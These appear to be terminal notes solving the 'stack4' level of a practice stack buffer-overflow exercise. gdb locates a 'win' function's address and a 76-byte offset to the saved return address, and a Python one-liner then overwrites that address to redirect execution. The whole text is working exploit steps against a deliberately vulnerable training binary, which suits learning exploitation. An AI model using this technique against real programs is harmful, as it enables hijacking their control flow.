gdb ./stack4
(gdb) break 16
(gdb) print win # 0x80483f4

python -c "print('a' * 64 + 'b' * 4 + 'c' * 4 + 'd' * 4 + 'e' * 4)" > ~/input4

gdb ./stack4
(gdb) run < ~/input4 # identify padding before EIP - 76

python -c "print('a' * 76 + 'f4830408'.decode('hex'))" | ./stack4
